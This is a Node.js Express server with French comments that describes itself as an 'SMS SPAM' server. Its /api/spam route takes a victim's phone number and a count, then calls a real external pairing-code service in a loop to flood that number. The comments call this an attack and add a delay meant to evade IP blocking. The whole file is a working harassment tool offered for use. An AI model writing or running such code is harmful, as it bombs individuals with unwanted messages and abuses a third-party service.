const express = require('express');
const path = require('path');
const app = express();
const PORT = process.env.PORT || 3000;

// On sert les fichiers statiques (le HTML qu'on vient de faire)
app.use(express.static(path.join(__dirname, 'public')));

// Route API qui déclenche l'attaque
app.post('/api/spam', async (req, res) => {
    const { number, count } = req.body;

    // Vérification basique
    if (!number || !count) {
        return res.status(400).json({ error: 'Numéro et nombre requis' });
    }

    console.log(`[${new Date().toISOString()}] Attaque lancée vers ${number} x${count}`);

    try {
        let results = [];
        
        // Boucle pour envoyer autant de fois que demandé
        for (let i = 0; i < count; i++) {
            try {
                // Appel réel au service cible
                const response = await fetch(`https://prabath-md-pair-web-v2-slk.koyeb.app/code?number=${number}`, {
                    timeout: 5000 // 5 secondes max par appel
                });

                results.push({
                    status: response.status,
                    time: new Date().toISOString()
                });

                // Petit délai entre chaque envoi pour ne pas surcharger 
                // et éviter que Render ne bloque l'IP
                if (i < count - 1) {
                    await new Promise(resolve => setTimeout(resolve, 600)); 
                }

            } catch (err) {
                results.push({
                    status: 'Error',
                    error: err.message,
                    time: new Date().toISOString()
                });
            }
        }

        // Réponse finale envoyée au navigateur
        res.json({ 
            success: true, 
            message: `${count} requêtes traitées`, 
            details: results 
        });

    } catch (globalErr) {
        res.status(500).json({ error: 'Erreur serveur interne', details: globalErr.message });
    }
});

// Démarrage du serveur
app.listen(PORT, () => {
    console.log(`Serveur SMS SPAM prêt sur le port ${PORT}`);
});
